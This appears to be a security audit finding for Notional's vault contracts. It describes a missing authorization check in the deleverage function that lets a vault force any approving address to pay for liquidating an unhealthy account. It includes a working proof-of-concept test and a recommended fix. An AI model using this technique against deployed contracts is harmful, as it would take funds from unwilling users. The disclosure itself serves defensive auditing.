# When `ONLY_VAULT_DELEVERAGE` is enabled a vault can force an arbitrary address to liquidate an unhealthy vault account

## Summary
When `ONLY_VAULT_DELEVERAGE` is enabled a vault can force an arbitrary address to liquidate an unhealthy vault account

## Vulnerability Detail
When the `ONLY_VAULT_DELEVERAGE` flag is set, only the vault address itself can call `deleverageAccount` in `VaultAccountAction.sol`. This is enforced via the `_authenticateDeleverage` function:

```solidity
// Authorization rules for deleveraging
if (vaultConfig.getFlag(VaultConfiguration.ONLY_VAULT_DELEVERAGE)) {
    require(msg.sender == vault, "Unauthorized");
} else {
    require(msg.sender == liquidator, "Unauthorized");
}
```

However, inside the `if` block when the `ONLY_VAULT_DELEVERAGE` flag is set, the `require` statement only checks that `msg.sender == vault`. This check is different from the other check in the `else` block as it does not check that the passed-in `liquidator` address is also the vault address. This means the vault address can supply _any_ address as the liquidator, which is ultimately the address that has to pay the token amount to liquidate an unhealthy vault account. As long as the unwilling liquidator meets the following conditions it can be forced to liquidate accounts by the vault:

1. The liquidator has enough of the underlying tokens necessary for liquidation.
2. The liquidator has approved the Notional proxy address with enough tokens necessary for liquidation.
3. The liquidator does not already have a position in the vault whose maturity is different from the one of the unhealthy account.

## Impact
A vault can force _any_ address to liquidate an unhealthy vault account so long as the above conditions are met, even if the liquidation would be unprofitable for the liquidator.

## Code Snippet
PoC (add to `tests/stateful/vaults/test_vault_deleverage.py`):
```python3
def test_deleverage_account_from_vault_with_different_account(environment, accounts, vault):
    environment.notional.updateVault(
        vault.address,
        get_vault_config(currencyId=2, flags=set_flags(0, ENABLED=True, ONLY_VAULT_DELEVERAGE=1)),
        100_000_000e8,
    )
    maturity = environment.notional.getActiveMarkets(1)[0][1]
    vaultAccount = accounts.at(vault.address, force=True)

    # The vault account does not have any DAI/cDAI that would be necessary to liquidate an account
    assert environment.token["DAI"].balanceOf(vaultAccount) == 0
    assert environment.cToken["DAI"].balanceOf(vaultAccount) == 0

    environment.notional.enterVault(
        accounts[1], vault.address, 50_000e18, maturity, 200_000e8, 0, "", {"from": accounts[1]}
    )

    vault.setExchangeRate(0.95e18)

    accountInfo = environment.notional.getVaultAccount(accounts[2], vault)
    assert accountInfo["maturity"] == 0

    # Notice how the liquidator here is accounts[2], but the caller is the vault account.
    # accounts[2] meets the 3 requirements:
    # 1) holds enough DAI/cDAI to liquidate an account
    # 2) has approved the Notional proxy to transfer tokens (maybe they are interacting with other
    #    functionality within Notional)
    # 3) does not currently hold a maturity in the vault
    environment.notional.deleverageAccount(
        accounts[1], vault.address, accounts[2], 1_000e8, True, "", {"from": vaultAccount}
    )

    accountInfo = environment.notional.getVaultAccount(accounts[2], vault)
    # accounts[2] now has a position in the vault due to the forced liquidation
    assert accountInfo["maturity"] != 0
```

## Tool used

Manual Review

## Recommendation
Consider adding a check to `_authenticateDeleverage` to ensure that when the `ONLY_VAULT_DELEVERAGE` flag is set the vault account can only set the liquidator to be itself or its owner address.
